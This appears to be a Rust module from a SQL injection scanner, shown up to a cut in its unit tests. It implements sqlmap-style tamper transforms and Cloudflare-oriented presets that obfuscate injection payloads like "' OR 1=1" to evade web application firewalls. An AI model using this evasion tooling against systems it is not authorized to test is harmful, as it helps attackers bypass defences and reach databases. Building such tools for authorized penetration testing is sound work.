#![deny(unsafe_code)]

use regex::Regex;
use std::fmt::Write as _;
use std::sync::OnceLock;

/// WAF evasion tamper — applies a single transformation to a payload string.
///
/// Each variant maps to a well-known `sqlmap` tamper / `PayloadsAllTheThings` technique.
/// Composition via [`apply_tampers`] allows stacking (e.g. `space2comment,randomcase`).
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
#[non_exhaustive]
pub enum Tamper {
    /// `" "` → `/**/`
    Space2Comment,
    /// `" "` → `+`
    Space2Plus,
    /// `" "` → `%09` (tab)
    Space2Tab,
    /// `" "` → `%0a` (newline)
    Space2Newline,
    /// `" "` → random blank among `%09 %0a %0c %0d %a0 +`
    Space2RandomBlank,
    /// Randomly mix `SeLeCt` case
    RandomCase,
    /// MySQL versioned comments: `SELECT` → `/*!50000SELECT*/`
    VersionedComment,
    /// Insert `/**/` between keyword letters: `SELECT` → `S/**/E/**/L...`
    BetweenComment,
    /// Percent-encode non-alnum (` ` → `%20`) — `charencode`
    CharEncode,
    /// Double URL-encode (`%` → `%25`)
    DoubleEncode,
    /// Hex `%xx` per byte
    HexEncode,
    /// Unicode `%uXXXX` per char
    UnicodeEncode,
    /// UTF-8 overlong (`/` → `%c0%af`)
    OverlongUtf8,
    /// `" "` → `--%0A` (MySQL dash comment + newline, sqlmap `space2dash`)
    Space2Dash,
    /// `" "` → random MSSQL blank among `%09 %0A %0B %0C %0D` (sqlmap `space2mssqlblank`)
    Space2MssqlBlank,
    /// `" "` → random `/**/` or `/**/**/` (sqlmap `randomcomments`)
    RandomComments,
    /// Bare `=` → ` LIKE ` (`1=1` → `1 LIKE 1`; `>=`/`<=`/`!=` untouched,
    /// sqlmap `equaltolike`)
    EqualToLike,
    /// Extended keyword set → `/*!50000KW*/` (sqlmap `versionedmorekeywords`);
    /// wraps more keywords than [`Tamper::VersionedComment`]
    VersionedMoreKeywords,
    /// Whole payload → Base64 (opaque to the backend unless it decodes;
    /// **breaks boolean TRUE/FALSE differentials**, see [`Tamper::is_boolean_safe`])
    Base64Encode,
    /// `" "` → `(` separator with balancing `)` (`' OR 1=1` → `'OR(1=1)`;
    /// spaces adjacent to quotes/operators are dropped, alnum–alnum gaps
    /// get `(`). Deterministic, no spaces left in the body.
    Space2Paren,
    /// Seeded MySQL version fuzz: `SELECT` → `/*!<V>SELECT*/` or
    /// `/**!<V>SELECT*/` with `<V>` drawn from
    /// `0/32302/50000/80000/99999` (Cloudflare/CRS signature diversity).
    VersionedFuzz,
    /// `"` → `\u0022`, `'` → `\u0027`, ` ` → `\u0020`, `/` → `\u002f`
    /// (JSON-unicode escapes; trailing line-comment terminator preserved).
    /// **Breaks boolean TRUE/FALSE differentials** like [`Tamper::Base64Encode`]:
    /// the backend sees literal `\u0027` (no quote to close), so both branches
    /// go inert (equally false) — see [`Tamper::is_boolean_safe`].
    JsonUnicodeEscape,
    /// Seeded numeric obfuscation: integer literals → `{n}e0` (`1=1` →
    /// `1e0=1e0`) or ASCII-hex (`1` → `0x31`); equality coherence keeps
    /// TRUE/FALSE differentials valid either way.
    NumericObfuscate,
    /// Seeded trailing line-comment swap: `-- -`/`--`/`#...` → `--+`,
    /// `%23` or `;/*` (Cloudflare/CRS terminator signatures).
    LineComment,
}

impl Tamper {
    #[must_use]
    pub fn name(&self) -> &'static str {
        match self {
            Self::Space2Comment => "space2comment",
            Self::Space2Plus => "space2plus",
            Self::Space2Tab => "space2tab",
            Self::Space2Newline => "space2newline",
            Self::Space2RandomBlank => "space2randomblank",
            Self::RandomCase => "randomcase",
            Self::VersionedComment => "versionedcomment",
            Self::BetweenComment => "betweencomment",
            Self::CharEncode => "charencode",
            Self::DoubleEncode => "doubleurlencode",
            Self::HexEncode => "hexencode",
            Self::UnicodeEncode => "unicodeencode",
            Self::OverlongUtf8 => "overlongutf8",
            Self::Space2Dash => "space2dash",
            Self::Space2MssqlBlank => "space2mssqlblank",
            Self::RandomComments => "randomcomments",
            Self::EqualToLike => "equaltolike",
            Self::VersionedMoreKeywords => "versionedmorekeywords",
            Self::Base64Encode => "base64encode",
            Self::Space2Paren => "space2paren",
            Self::VersionedFuzz => "versionedfuzz",
            Self::JsonUnicodeEscape => "jsonunicodeescape",
            Self::NumericObfuscate => "numericobfuscate",
            Self::LineComment => "linecomment",
        }
    }

    #[must_use]
    pub fn from_name(name: &str) -> Option<Self> {
        match name.to_ascii_lowercase().as_str() {
            "space2comment" | "space2inline" | "comment" => Some(Self::Space2Comment),
            "space2plus" => Some(Self::Space2Plus),
            "space2tab" => Some(Self::Space2Tab),
            "space2newline" | "space2line" => Some(Self::Space2Newline),
            "space2randomblank" | "space2random" | "randomblank" => Some(Self::Space2RandomBlank),
            "randomcase" | "case" | "mixcase" => Some(Self::RandomCase),
            "versionedcomment" | "versioned" | "versionedkeywords" => Some(Self::VersionedComment),
            "betweencomment" | "between" | "charchar" => Some(Self::BetweenComment),
            "charencode" | "char" | "urlencode" | "url" => Some(Self::CharEncode),
            "doubleurlencode" | "doubleencode" | "doubleurl" | "double" => Some(Self::DoubleEncode),
            "hexencode" | "hex" => Some(Self::HexEncode),
            "unicodeencode" | "unicode" | "utf8unicode" => Some(Self::UnicodeEncode),
            "overlongutf8" | "overlong" | "utf8overlong" => Some(Self::OverlongUtf8),
            "space2dash" | "dash" => Some(Self::Space2Dash),
            "space2mssqlblank" | "space2mssql" | "mssqlblank" => Some(Self::Space2MssqlBlank),
            "randomcomments" | "randomcomment" | "comments" => Some(Self::RandomComments),
            "equaltolike" | "equal2like" | "like" => Some(Self::EqualToLike),
            "versionedmorekeywords" | "versionedmore" | "morekeywords" => {
                Some(Self::VersionedMoreKeywords)
            }
            "base64encode" | "base64" | "b64" => Some(Self::Base64Encode),
            "space2paren" | "spaceparen" | "paren" => Some(Self::Space2Paren),
            "versionedfuzz" | "versionedrandom" | "fuzzversioned" => Some(Self::VersionedFuzz),
            "jsonunicodeescape" | "jsonunicode" | "jsonescape" => Some(Self::JsonUnicodeEscape),
            "numericobfuscate" | "equalobfuscate" | "numeric" | "numericfuzz" => {
                Some(Self::NumericObfuscate)
            }
            "linecomment" | "linecommentfuzz" | "commentfuzz" | "trailingcomment" => {
                Some(Self::LineComment)
            }
            _ => None,
        }
    }

    #[must_use]
    pub fn all_names() -> &'static [&'static str] {
        &[
            "space2comment",
            "space2plus",
            "space2tab",
            "space2newline",
            "space2randomblank",
            "randomcase",
            "versionedcomment",
            "betweencomment",
            "charencode",
            "doubleurlencode",
            "hexencode",
            "unicodeencode",
            "overlongutf8",
            "space2dash",
            "space2mssqlblank",
            "randomcomments",
            "equaltolike",
            "versionedmorekeywords",
            "base64encode",
            "space2paren",
            "versionedfuzz",
            "jsonunicodeescape",
            "numericobfuscate",
            "linecomment",
        ]
    }

    /// Whether this tamper preserves boolean TRUE/FALSE differentials.
    ///
    /// Most tampers rewrite both sides of the pair identically, so the
    /// differential stays valid. [`Tamper::Base64Encode`] makes the whole
    /// payload opaque to backends that do not Base64-decode, and
    /// [`Tamper::JsonUnicodeEscape`] escapes the quotes the injection needs
    /// (`'` → `\u0027`): both branches become equally inert/false. TRUE and
    /// FALSE become indistinguishable, so boolean-style detectors must skip
    /// sets containing either (see [`boolean_safe_transformation_sets`]).
    #[must_use]
    pub const fn is_boolean_safe(&self) -> bool {
        !matches!(self, Self::Base64Encode | Self::JsonUnicodeEscape)
    }

    /// Apply this single tamper to `payload` and return the transformed string.
    ///
    /// Space-substituting tampers that emit literal (non-decode-symmetric)
    /// text ([`Tamper::Space2Comment`], [`Tamper::RandomComments`]) preserve a
    /// trailing SQL line comment (`-- ...` / `#...`): mangling the space in
    /// `-- -` into `--/**/-` is not a comment in MySQL and would break every
    /// payload that relies on the terminator.
    ///
    /// OS-random convenience wrapper around [`Self::apply_with_rng`];
    /// seeded runs must use `apply_with_rng` with
    /// [`crate::seeded_rng::make_rng`] so `--seed` is deterministic.
    /// Routed through `make_rng(None)` (OS randomness) so every RNG in the
    /// crate shares the single seeded entry point (`--seed` never leaks in).
    #[must_use]
    pub fn apply(&self, payload: &str) -> String {
        let mut rng = crate::seeded_rng::make_rng(None);
        self.apply_with_rng(payload, &mut rng)
    }

    /// Seeded variant of [`Self::apply`]: all randomness is drawn from `rng`.
    /// Pass `&mut crate::seeded_rng::make_rng(seed)` for deterministic runs.
    #[must_use]
    pub fn apply_with_rng(&self, payload: &str, rng: &mut impl rand::Rng) -> String {
        match self {
            Self::Space2Comment => {
                let (body, tail) = split_trailing_comment(payload);
                format!("{}{tail}", body.replace(' ', "/**/"))
            }
            Self::Space2Plus => payload.replace(' ', "+"),
            Self::Space2Tab => payload.replace(' ', "%09"),
            Self::Space2Newline => payload.replace(' ', "%0a"),
            Self::Space2RandomBlank => {
                let blanks = ["%09", "%0a", "%0c", "%0d", "%a0", "+"];
                let mut out = String::with_capacity(payload.len() * 2);
                for ch in payload.chars() {
                    if ch == ' ' {
                        let idx = rng.random_range(0..blanks.len());
                        out.push_str(blanks[idx]);
                    } else {
                        out.push(ch);
                    }
                }
                out
            }
            Self::RandomCase => payload
                .chars()
                .map(|c| {
                    if c.is_ascii_alphabetic() && rng.random_bool(0.5) {
                        if c.is_ascii_lowercase() {
                            c.to_ascii_uppercase()
                        } else {
                            c.to_ascii_lowercase()
                        }
                    } else {
                        c
                    }
                })
                .collect(),
            Self::VersionedComment => apply_versioned_comment(payload),
            Self::BetweenComment => apply_between_comment(payload),
            Self::CharEncode => char_encode(payload),
            Self::DoubleEncode => {
                let once = char_encode(payload);
                char_encode(&once)
            }
            Self::HexEncode => payload.bytes().fold(String::new(), |mut acc, b| {
                let _ = write!(acc, "%{b:02x}");
                acc
            }),
            Self::UnicodeEncode => payload.chars().fold(String::new(), |mut acc, c| {
                let _ = write!(acc, "%u{:04x}", c as u32);
                acc
            }),
            Self::OverlongUtf8 => overlong_encode(payload),
            Self::Space2Dash => payload.replace(' ', "--%0A"),
            Self::Space2MssqlBlank => {
                let blanks = ["%09", "%0A", "%0B", "%0C", "%0D"];
                let mut out = String::with_capacity(payload.len() * 2);
                for ch in payload.chars() {
                    if ch == ' ' {
                        let idx = rng.random_range(0..blanks.len());
                        out.push_str(blanks[idx]);
                    } else {
                        out.push(ch);
                    }
                }
                out
            }
            Self::RandomComments => {
                let (body, tail) = split_trailing_comment(payload);
                let mut out = String::with_capacity(payload.len() * 2);
                for ch in body.chars() {
                    if ch == ' ' {
                        if rng.random_bool(0.5) {
                            out.push_str("/**/**/");
                        } else {
                            out.push_str("/**/");
                        }
                    } else {
                        out.push(ch);
                    }
                }
                out.push_str(tail);
                out
            }
            Self::EqualToLike => apply_equal_to_like(payload),
            Self::VersionedMoreKeywords => apply_versioned_more_keywords(payload),
            Self::Base64Encode => {
                use base64::Engine as _;
                base64::engine::general_purpose::STANDARD.encode(payload.as_bytes())
            }
            Self::Space2Paren => apply_space2paren(payload),
            Self::VersionedFuzz => apply_versioned_fuzz(payload, rng),
            Self::JsonUnicodeEscape => apply_json_unicode_escape(payload),
            Self::NumericObfuscate => apply_numeric_obfuscate(payload, rng),
            Self::LineComment => apply_linecomment(payload, rng),
        }
    }
}

/// Parse a comma-separated tamper list (e.g. `"space2comment,randomcase"`).
/// Unknown names are ignored with a `tracing::warn!`; empty input yields `Vec::new()`.
///
/// Preset aliases (expanded inline, case-insensitive, never in
/// [`Tamper::all_names`]):
/// - `"cloudflare-generic"` → `randomcase,space2comment,versionedmorekeywords`
/// - `"aggressive"` → `randomcase,space2paren,versionedfuzz,equaltolike`
#[must_use]
pub fn parse_tamper_list(input: Option<&str>) -> Vec<Tamper> {
    let Some(raw) = input else {
        return Vec::new();
    };
    let trimmed = raw.trim();
    if trimmed.is_empty() || trimmed.eq_ignore_ascii_case("none") {
        return Vec::new();
    }
    let mut out = Vec::new();
    for part in trimmed.split(',') {
        let name = part.trim();
        if name.is_empty() {
            continue;
        }
        if name.eq_ignore_ascii_case("cloudflare-generic") {
            out.extend([
                Tamper::RandomCase,
                Tamper::Space2Comment,
                Tamper::VersionedMoreKeywords,
            ]);
        } else if name.eq_ignore_ascii_case("aggressive") {
            out.extend([
                Tamper::RandomCase,
                Tamper::Space2Paren,
                Tamper::VersionedFuzz,
                Tamper::EqualToLike,
            ]);
        } else if let Some(t) = Tamper::from_name(name) {
            out.push(t);
        } else {
            tracing::warn!(tamper=%name, available=?Tamper::all_names(), "unknown tamper ignored");
        }
    }
    out
}

/// Apply a sequence of tampers in order. Empty slice returns `payload` unchanged.
///
/// OS-random wrapper around [`apply_tampers_with_rng`]; seeded runs must use
/// the `_with_rng` variant with [`crate::seeded_rng::make_rng`].
/// Routed through `make_rng(None)` so the seeded entry point stays unique.
#[must_use]
pub fn apply_tampers(payload: &str, tampers: &[Tamper]) -> String {
    let mut rng = crate::seeded_rng::make_rng(None);
    apply_tampers_with_rng(payload, tampers, &mut rng)
}

/// Seeded variant of [`apply_tampers`]: randomness is drawn from `rng`.
#[must_use]
pub fn apply_tampers_with_rng(
    payload: &str,
    tampers: &[Tamper],
    rng: &mut impl rand::Rng,
) -> String {
    let mut out = payload.to_owned();
    for t in tampers {
        out = t.apply_with_rng(&out, rng);
    }
    out
}

/// Expand `payload` into variants to try.
/// - No tampers → `[payload]`
/// - With tampers → original + each single tamper + full chain. Deduped.
///
/// This bounds explosion to `t.len()+2` variants instead of `2^t`.
///
/// OS-random wrapper around [`expand_with_tampers_with_rng`]; seeded runs
/// must use the `_with_rng` variant.
/// Routed through `make_rng(None)` so the seeded entry point stays unique.
#[must_use]
pub fn expand_with_tampers(payload: &str, tampers: &[Tamper]) -> Vec<String> {
    let mut rng = crate::seeded_rng::make_rng(None);
    expand_with_tampers_with_rng(payload, tampers, &mut rng)
}

/// Seeded variant of [`expand_with_tampers`]: randomness is drawn from `rng`
/// in single-then-chain order, so the same seed yields identical variants.
#[must_use]
pub fn expand_with_tampers_with_rng(
    payload: &str,
    tampers: &[Tamper],
    rng: &mut impl rand::Rng,
) -> Vec<String> {
    if tampers.is_empty() {
        return vec![payload.to_owned()];
    }
    let mut variants = Vec::with_capacity(tampers.len() + 2);
    variants.push(payload.to_owned());
    for t in tampers {
        let v = t.apply_with_rng(payload, rng);
        if !variants.contains(&v) {
            variants.push(v);
        }
    }
    let chained = apply_tampers_with_rng(payload, tampers, rng);
    if !variants.contains(&chained) {
        variants.push(chained);
    }
    variants
}

/// Return the list of tamper transformation sets to try.
///
/// Each set is a `Vec<Tamper>` so that paired payloads (TRUE/FALSE boolean)
/// can be transformed consistently with the same set, rather than independently
/// expanding each string and mismatching indices.
///
/// Layout: `[]` (original) + each single + full chain, deduped by resulting
/// transformation identity. Keeps the same `t.len()+2` bound as `expand_with_tampers`.
#[must_use]
pub fn tamper_transformation_sets(tampers: &[Tamper]) -> Vec<Vec<Tamper>> {
    if tampers.is_empty() {
        return vec![Vec::new()];
    }
    let mut sets: Vec<Vec<Tamper>> = Vec::with_capacity(tampers.len() + 2);
    sets.push(Vec::new());
    for t in tampers {
        let single = vec![t.clone()];
        if !sets.contains(&single) {
            sets.push(single);
        }
    }
    if !sets.contains(&tampers.to_vec()) {
        sets.push(tampers.to_vec());
    }
    sets
}

/// Boolean-differential-safe variant of [`tamper_transformation_sets`].
///
/// Drops every set containing a tamper for which [`Tamper::is_boolean_safe`]
/// is `false` (currently [`Tamper::Base64Encode`] and
/// [`Tamper::JsonUnicodeEscape`]): an opaque/inert transform would
/// make TRUE and FALSE indistinguishable and could mask a real finding or
/// waste the confirmation budget. The `[]` (original) set is always kept, so
/// the result is never empty and stays within the same `t.len()+2` bound.
///
/// Single-payload techniques (error, time, union, stacked, OOB) keep using
/// [`tamper_transformation_sets`]: there is no pair to keep coherent there.
#[must_use]
pub fn boolean_safe_transformation_sets(tampers: &[Tamper]) -> Vec<Vec<Tamper>> {
    let safe: Vec<Tamper> = tampers
        .iter()
        .filter(|t| t.is_boolean_safe())
        .cloned()
        .collect();
    if safe.len() == tampers.len() {
        return tamper_transformation_sets(tampers);
    }
    if safe.is_empty() {
        return vec![Vec::new()];
    }
    tamper_transformation_sets(&safe)
}

// ── helpers ──────────────────────────────────────────────────────────────

/// Split `(body, trailing line comment)` so space-substituting tampers keep
/// `-- ...` / `#...` terminators intact (`--/**/-` is not a comment).
/// Only the LAST `--` (followed by whitespace/end) or `#` counts, so `--`
/// inside string literals earlier in the payload is left alone.
fn split_trailing_comment(payload: &str) -> (&str, &str) {
    if let Some(idx) = payload.rfind('#') {
        return payload.split_at(idx);
    }
    let bytes = payload.as_bytes();
    let mut i = bytes.len();
    while i >= 2 {
        if bytes[i - 2] == b'-' && bytes[i - 1] == b'-' {
            let rest = &payload[i..];
            if rest.is_empty() || rest.starts_with(&[' ', '\t', '\n', '\r'][..]) {
                return payload.split_at(i - 2);
            }
        }
        i -= 1;
    }
    (payload, "")
}

fn char_encode(input: &str) -> String {
    let mut out = String::with_capacity(input.len() * 3);
    for b in input.bytes() {
        let c = b as char;
        if c.is_ascii_alphanumeric() || c == '_' || c == '-' || c == '.' || c == '~' {
            out.push(c);
        } else {
            let _ = write!(out, "%{b:02x}");
        }
    }
    out
}

fn overlong_encode(input: &str) -> String {
    let mut out = String::with_capacity(input.len() * 6);
    // Char loop (was byte loop): overlong 2-byte form is only defined for
    // ASCII bytes < 0x80. Non-ASCII chars pass through untouched instead of
    // being mangled byte-by-byte (`0x80 | b` is a no-op for b >= 0x80).
    for c in input.chars() {
        if c.is_ascii_alphanumeric() {
            out.push(c);
        } else if c.is_ascii() {
            // overlong 2-byte UTF-8: 0xC0 | (b>>6), 0x80 | (b & 0x3F)
            // for ASCII b < 0x80, first byte is always 0xC0, second is 0x80|b
            let b = c as u8;
            let b1 = 0xC0u8;
            let b2 = 0x80u8 | b;
            let _ = write!(out, "%{b1:02x}%{b2:02x}");
        } else {
            out.push(c);
        }
    }
    out
}

static KEYWORDS: &[&str] = &[
    "SELECT",
    "UNION",
    "OR",
    "AND",
    "FROM",
    "WHERE",
    "SLEEP",
    "BENCHMARK",
    "EXTRACTVALUE",
    "UPDATEXML",
    "CONCAT",
    "CAST",
    "CONVERT",
    "WAITFOR",
    "DELAY",
    "ORDER",
    "BY",
    "GROUP",
    "HAVING",
    "LIMIT",
    "BETWEEN",
    "LIKE",
    "INTO",
    "VALUES",
    "INSERT",
    "UPDATE",
    "DELETE",
    "DROP",
    "TABLE",
];

/// Keyword regex compiled once. Returns `None` instead of panicking when
/// the (constant) pattern fails to build — callers treat `None` as
/// match-never and return the payload unchanged.
fn keyword_regex() -> Option<&'static Regex> {
    static RE: OnceLock<Option<Regex>> = OnceLock::new();
    RE.get_or_init(|| {
        let pattern = format!(r"(?i)\b({})\b", KEYWORDS.join("|"));
        Regex::new(&pattern).ok()
    })
    .as_ref()
}

fn apply_versioned_comment(payload: &str) -> String {
    let Some(re) = keyword_regex() else {
        return payload.to_owned();
    };
    re.replace_all(payload, |caps: &regex::Captures| {
        let m = &caps[0];
        format!("/*!50000{m}*/")
    })
    .into_owned()
}

/// `=` → ` LIKE `, except when part of `>=`, `<=`, `!=`, `<>`, `==`
/// (used by `LENGTH(...)>=N` extraction oracles). Keeps boolean
/// TRUE/FALSE coherent: `1=1` → `1 LIKE 1` (true), `1=2` → `1 LIKE 2` (false).
fn apply_equal_to_like(payload: &str) -> String {
    let chars: Vec<char> = payload.chars().collect();
    let mut out = String::with_capacity(payload.len() + 8);
    for (i, &c) in chars.iter().enumerate() {
        if c != '=' {
            out.push(c);
            continue;
        }
        let prev = if i > 0 { Some(chars[i - 1]) } else { None };
        let next = chars.get(i + 1).copied();
        let is_comparison =
            matches!(prev, Some('>' | '<' | '!' | '=')) || matches!(next, Some('=' | '>'));
        if is_comparison {
            out.push('=');
        } else {
            out.push_str(" LIKE ");
        }
    }
    out
}

/// Extra keywords wrapped only by [`Tamper::VersionedMoreKeywords`]
/// (disjoint from [`KEYWORDS`] so the two tampers stay distinguishable).
static MORE_KEYWORDS: &[&str] = &[
    "ALL",
    "DISTINCT",
    "AS",
    "ON",
    "JOIN",
    "LEFT",
    "RIGHT",
    "INNER",
    "OUTER",
    "CASE",
    "WHEN",
    "THEN",
    "ELSE",
    "END",
    "NOT",
    "NULL",
    "IS",
    "IN",
    "EXISTS",
    "COUNT",
    "SUM",
    "AVG",
    "MIN",
    "MAX",
    "LENGTH",
    "SUBSTRING",
    "SUBSTR",
    "ASCII",
    "CHAR",
    "DATABASE",
    "USER",
    "VERSION",
    "SCHEMA",
    "INFORMATION_SCHEMA",
    "LOAD_FILE",
    "OUTFILE",
    "RLIKE",
    "REGEXP",
    "XOR",
    "DIV",
    "MOD",
    "TOP",
    "OFFSET",
    "FETCH",
    "DECLARE",
    "EXEC",
    "EXECUTE",
    "TRUE",
    "FALSE",
    "PG_SLEEP",
];

fn keyword_more_regex() -> Option<&'static Regex> {
    static RE: OnceLock<Option<Regex>> = OnceLock::new();
    RE.get_or_init(|| {
        let mut all: Vec<&str> = Vec::with_capacity(KEYWORDS.len() + MORE_KEYWORDS.len());
        all.extend_from_slice(KEYWORDS);
        all.extend_from_slice(MORE_KEYWORDS);
        let pattern = format!(r"(?i)\b({})\b", all.join("|"));
        Regex::new(&pattern).ok()
    })
    .as_ref()
}

fn apply_versioned_more_keywords(payload: &str) -> String {
    let Some(re) = keyword_more_regex() else {
        return payload.to_owned();
    };
    re.replace_all(payload, |caps: &regex::Captures| {
        let m = &caps[0];
        format!("/*!50000{m}*/")
    })
    .into_owned()
}

fn apply_between_comment(payload: &str) -> String {
    // Cheap heuristic: insert /**/ between letters of SQL keywords.
    // e.g. SELECT -> S/**/E/**/L/**/E/**/C/**/T
    let Some(re) = keyword_regex() else {
        return payload.to_owned();
    };
    re.replace_all(payload, |caps: &regex::Captures| {
        let m = &caps[0];
        let mut out = String::with_capacity(m.len() * 5);
        let chars: Vec<char> = m.chars().collect();
        for (i, ch) in chars.iter().enumerate() {
            out.push(*ch);
            if i + 1 < chars.len() {
                out.push_str("/**/");
            }
        }
        out
    })
    .into_owned()
}

/// Space → parenthesis separator (`' OR 1=1` → `'OR(1=1)`).
///
/// Deterministic (no RNG): every `' '` in the body is either dropped (no
/// separator needed — at least one side is an operator/quote/paren, or a
/// `digit→letter` boundary like `1 AND` which lexes apart, except `e`/`E`
/// which would start scientific notation) or replaced with `(` (alnum–alnum
/// gaps like `OR 1` that would otherwise merge into one token). Inserted
/// `(` are balanced by appending `)` before the trailing line-comment
/// terminator (preserved verbatim via [`split_trailing_comment`]).
fn apply_space2paren(payload: &str) -> String {
    fn is_word(ch: char) -> bool {
        ch.is_alphanumeric() || ch == '_'
    }
    let (body, tail) = split_trailing_comment(payload);
    if !body.contains(' ') {
        return payload.to_owned();
    }
    let chars: Vec<char> = body.chars().collect();
    let mut out = String::with_capacity(body.len() + 8);
    let mut prev: Option<char> = None;
    let mut open: usize = 0;
    for (i, &ch) in chars.iter().enumerate() {
        if ch != ' ' {
            out.push(ch);
            prev = Some(ch);
            continue;
        }
        let Some(p) = prev else {
            continue; // leading space: drop
        };
        let Some(&nxt) = chars.get(i + 1) else {
            continue; // trailing space of the body (before `tail`): drop
        };
        if nxt == ' ' {
            continue; // collapse runs: re-evaluate against the next real char
        }
        if is_word(p) && is_word(nxt) {
            // `1 AND` (digit→letter, except `e`/`E`) lexes apart on its own.
            if p.is_ascii_digit() && nxt.is_ascii_alphabetic() && !matches!(nxt, 'e' | 'E') {
                continue;
            }
            out.push('(');
            open += 1;
            prev = Some('(');
        }
        // else: operator/quote/paren on at least one side delimits — drop.
    }
    for _ in 0..open {
        out.push(')');
    }
    out.push_str(tail);
    out
}

/// Seeded MySQL version fuzz: wraps the same keyword set as
/// [`Tamper::VersionedComment`] but draws one `<V>` per payload from
/// `0/32302/50000/80000/99999` plus one `/*!` vs `/**!` opening per payload
/// from `rng`, so `--seed` replays byte-identical output.
fn apply_versioned_fuzz(payload: &str, rng: &mut impl rand::Rng) -> String {
    static VERSIONS: &[&str] = &["0", "32302", "50000", "80000", "99999"];
    let Some(re) = keyword_regex() else {
        return payload.to_owned();
    };
    let version = VERSIONS[rng.random_range(0..VERSIONS.len())];
    let opener = if rng.random_bool(0.5) { "/**!" } else { "/*!" };
    re.replace_all(payload, |caps: &regex::Captures| {
        let m = &caps[0];
        format!("{opener}{version}{m}*/")
    })
    .into_owned()
}

/// JSON-unicode escapes for WAF-visible chars, applied to the body only
/// (trailing `-- ...`/`#...` terminator preserved verbatim).
///
/// NOT boolean-safe: escaping `'`/`"` removes the quote the injection relies
/// on, so both TRUE and FALSE branches go inert (equally false) even though
/// the transformed strings stay `a != b`. Boolean detectors must skip it
/// (see [`Tamper::is_boolean_safe`]); string-level `assert_ne!` alone cannot
/// catch this semantic collapse.
fn apply_json_unicode_escape(payload: &str) -> String {
    let (body, tail) = split_trailing_comment(payload);
    let mut out = String::with_capacity(body.len() + 16);
    for ch in body.chars() {
        match ch {
            '"' => out.push_str("\\u0022"),
            '\'' => out.push_str("\\u0027"),
            ' ' => out.push_str("\\u0020"),
            '/' => out.push_str("\\u002f"),
            _ => out.push(ch),
        }
    }
    out.push_str(tail);
    out
}

fn integer_literal_regex() -> Option<&'static Regex> {
    static RE: OnceLock<Option<Regex>> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"\b\d+\b").ok()).as_ref()
}

/// Seeded numeric obfuscation over the body (terminator preserved).
/// One style per payload from `rng`: `{n}e0` (`1=1` → `1e0=1e0`, value
/// preserving) or ASCII-hex (`1` → `0x31`, equality preserving). Both keep
/// `TRUE == TRUE` and `TRUE != FALSE`, whatever each branch draws.
///
/// Two carve-outs keep function/arithmetic oracles coherent:
/// - digits inside `CHAR(...)`/`CHR(...)` are left untouched (`CHAR(97)` must
///   stay `97`: `CHAR(0x3937)` drifts from `'a'` and large codes can NULL/error
///   per DBMS, collapsing the differential);
/// - all-zero literals (`0`, `00`) stay `0` so `DIV 0 → NULL` (falsy, oracle
///   holds) and `XOR 0` (falsy) survive the ASCII-hex style (`0` → `0x30`=48
///   would turn falsy into truthy and flip `1 DIV 0` / `1 XOR 0` to true).
fn apply_numeric_obfuscate(payload: &str, rng: &mut impl rand::Rng) -> String {
    let (body, tail) = split_trailing_comment(payload);
    let Some(re) = integer_literal_regex() else {
        return payload.to_owned();
    };
    let protected = char_chr_protected_ranges(body);
    let hex_style = rng.random_bool(0.5);
    let replaced = re
        .replace_all(body, |caps: &regex::Captures| {
            let Some(m) = caps.get(0) else {
                return String::new();
            };
            let n = m.as_str();
            if n.bytes().all(|b| b == b'0') {
                return n.to_owned();
            }
            if protected
                .iter()
                .any(|&(start, end)| m.start() >= start && m.start() < end)
            {
                return n.to_owned();
            }
            if hex_style {
                let mut h = String::with_capacity(2 + n.len() * 2);
                h.push_str("0x");
                for b in n.bytes() {
                    let _ = write!(h, "{b:02x}");
                }
                h
            } else {
                format!("{n}e0")
            }
        })
        .into_owned();
    format!("{replaced}{tail}")
}

/// Byte ranges of `CHAR(...)` / `CHR(...)` argument lists in `body` where
/// [`apply_numeric_obfuscate`] must not rewrite integer literals.
/// Case-insensitive `char`/`chr` + optional whitespace + balanced parens;
/// unbalanced trailing `(` protects to end. Word-boundary checked so
/// `XCHAR(` does not match.
fn char_chr_protected_ranges(body: &str) -> Vec<(usize, usize)> {
    fn is_word_byte(b: u8) -> bool {
        b.is_ascii_alphanumeric() || b == b'_'
    }
    let bytes = body.as_bytes();
    let mut ranges = Vec::new();
    let mut i = 0;
    while i < bytes.len() {
        if i > 0 && is_word_byte(bytes[i - 1]) {
            i += 1;
            continue;
        }
        let mut len = 0;
        if body
            .get(i..i + 4)
            .is_some_and(|s| s.eq_ignore_ascii_case("char"))
        {
            len = 4;
        } else if body
            .get(i..i + 3)
            .is_some_and(|s| s.eq_ignore_ascii_case("chr"))
        {
            len = 3;
        }
        if len == 0 {
            i += 1;
            continue;
        }
        let mut j = i + len;
        while j < bytes.len() && bytes[j].is_ascii_whitespace() {
            j += 1;
        }
        if j >= bytes.len() || bytes[j] != b'(' {
            i += 1;
            continue;
        }
        let open = j;
        let mut depth = 1_usize;
        j += 1;
        while j < bytes.len() && depth > 0 {
            if bytes[j] == b'(' {
                depth += 1;
            } else if bytes[j] == b')' {
                depth = depth.saturating_sub(1);
            }
            j += 1;
        }
        if j > open + 1 {
            ranges.push((open + 1, j.saturating_sub(1)));
        }
        i = j;
    }
    ranges
}

/// Seeded trailing line-comment swap. Without a `split_trailing_comment`
/// tail the payload is returned unchanged (still boolean-safe: both
/// branches stay distinct).
fn apply_linecomment(payload: &str, rng: &mut impl rand::Rng) -> String {
    static VARIANTS: &[&str] = &["--+", "%23", ";/*"];
    let (body, tail) = split_trailing_comment(payload);
    if tail.is_empty() {
        return payload.to_owned();
    }
    let variant = VARIANTS[rng.random_range(0..VARIANTS.len())];
    format!("{body}{variant}")
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use super::*;

    #[test]
    fn parse_empty() {
        assert!(parse_tamper_list(None).is_empty());
        assert!(parse_tamper_list(Some("")).is_empty());
        assert!(parse_tamper_list(Some("none")).is_empty());
    }

    #[test]
    fn parse_single() {
        let v = parse_tamper_list(Some("space2comment"));
        assert_eq!(v, vec![Tamper::Space2Comment]);
    }

    #[test]
    fn parse_multiple_mixed_case() {
        let v = parse_tamper_list(Some("Space2Comment, RandomCase , charencode"));
        assert_eq!(
            v,
            vec![
                Tamper::Space2Comment,
                Tamper::RandomCase,
                Tamper::CharEncode
            ]
        );
    }

    #[test]
    fn parse_unknown_ignored() {
        let v = parse_tamper_list(Some("space2comment,notreal,hexencode"));
        assert_eq!(v, vec![Tamper::Space2Comment, Tamper::HexEncode]);
    }

    #[test]
    fn space2comment_basic() {
